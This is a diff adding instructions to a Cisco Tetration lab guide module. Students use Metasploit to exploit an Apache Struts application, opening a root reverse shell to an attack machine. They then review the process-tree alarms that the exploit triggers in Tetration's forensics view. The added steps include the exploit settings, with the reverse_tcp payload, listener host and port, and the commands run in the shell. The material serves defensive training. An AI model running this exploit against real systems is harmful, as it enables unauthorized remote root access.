@@ -115,13 +115,24 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-012"><a href="#step-012" style="font-weight:bold">Step 012</a></div>  
 
+Enter the following parameters for the attack. The Apache Outside NAT IP can be found in the student Excel workbook.  Use the `ifconfig` command to determine the ATTACK MACHINE IP.  You do not need to exit the msfconsole to run ifconfig.
 
+```
+set rhost <APACHE OUTSIDE NAT IP>
+set rport 8080
+set targeturl /showcase.action
+set payload linux/x64/shell/reverse_tcp
+set lhost <ATTACK MACHINE IP>
+set lport 80
+```
 
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_012.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_012.png" style="width:100%;height:100%;"></a>  
 
 
 
-<div class="step" id="step-013"><a href="#step-013" style="font-weight:bold">Step 013</a></div>  
+<div class="step" id="step-013"><a href="#step-013" style="font-weight:bold">Step 013</a></div>
+
+ Enter the command `show options` and review the information you have entered.
 
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_013.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_013.png" style="width:100%;height:100%;"></a>  
 
@@ -129,11 +140,21 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-014"><a href="#step-014" style="font-weight:bold">Step 014</a></div>  
 
+Type `exploit`.  The exploit code will be run against Apache Struts application running on the Linux web server,  and if successful should display the message "Command shell session opened".  You have now exploited a system and gained remote command shell access!  
+
+Enter `ls` to do a directory listing on the remote machine.
+
+Enter `whoami` to see that you are logged in as the root user.  This confirms we have full control of the machine.
+
+Run the command `hostnamectl` to display the host details.   
+
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_014.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_014.png" style="width:100%;height:100%;"></a>  
 
 
 
 <div class="step" id="step-015"><a href="#step-015" style="font-weight:bold">Step 015</a></div>  
+
+Back in Tetration,  navigate to Forensics Analysis.  
 
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_015.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_015.png" style="width:100%;height:100%;"></a>  
 
@@ -141,11 +162,17 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-016"><a href="#step-016" style="font-weight:bold">Step 016</a></div>  
 
+Change the time range to the last hour.  
+
+> It may take a few minutes for the alarms to be triggered.  Refresh the page until you see the alarms appear.
+
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_016.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_016.png" style="width:100%;height:100%;"></a>  
 
 
 
 <div class="step" id="step-017"><a href="#step-017" style="font-weight:bold">Step 017</a></div>  
+
+Click to examine the alarm for the hostnamectl command.  
 
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_017.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_017.png" style="width:100%;height:100%;"></a>  
 
@@ -153,11 +180,15 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-018"><a href="#step-018" style="font-weight:bold">Step 018</a></div>  
 
+Here we can see the process tree, and an indication of what happened.  A command shell (/bin/sh) was launched from the java process, which is not a normal activity. Then we can see the command that was run,  hostnamectl.  Click on the hostnamectl command to see more details.
+
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_018.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_018.png" style="width:100%;height:100%;"></a>  
 
 
 
 <div class="step" id="step-019"><a href="#step-019" style="font-weight:bold">Step 019</a></div>  
+
+Here we can see the forensics details of the command run and the privilege level under which the command was executed (root).   
 
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_019.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_019.png" style="width:100%;height:100%;"></a>  
 
@@ -165,10 +196,12 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-020"><a href="#step-020" style="font-weight:bold">Step 020</a></div>  
 
+Examine the other alarms that were generated. These show the initial access where the command shell was spawned from the Java process.  
+
 <a href="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_020.png"><img src="https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/images/module10_020.png" style="width:100%;height:100%;"></a>  
 
 
-
+YOU HAVE FINISHED THIS MODULE
 
 
 | [Return to Table of Contents](https://onstakinc.github.io/cisco-tetration-hol/labguide/) | [Go to Top of the Page](https://onstakinc.github.io/cisco-tetration-hol/labguide/module10/) | [Continue to the Next Module](https://onstakinc.github.io/cisco-tetration-hol/labguide/module11/) |
